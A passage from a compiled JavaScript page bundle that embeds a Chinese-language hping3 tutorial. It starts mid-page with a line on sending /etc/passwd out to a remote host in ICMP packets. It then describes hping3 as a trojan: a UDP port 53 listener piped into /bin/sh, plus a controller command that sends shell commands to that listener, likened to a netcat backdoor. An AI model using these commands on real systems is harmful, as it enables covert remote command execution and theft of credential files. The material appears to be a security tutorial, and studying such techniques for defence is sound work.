<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h3 id="木马功能" tabindex="-1"># 木马功能 <a class="header-anchor" href="#木马功能" aria-hidden="true">#</a></h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p><p>在木马启动端：</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.10.66--listen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">signature</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--safe</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--udp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">53</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">|</span><span style="color:#EEFFFF;"> </span><span style="color:#FFCB6B;">/bin/sh</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>在远程控制端：</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#82AAFF;">echo</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ls</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#C3E88D;">test.cmd</span></span>
<span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.10.44</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-p53</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-d</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">100</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--udp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--sign</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">siganature</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--file</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">./test.cmd</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>`,42),e=[o];function F(r,c,t,E,y,i){return a(),n("div",null,e)}const d=s(p,[["render",F]]);export{D as __pageData,d as default};
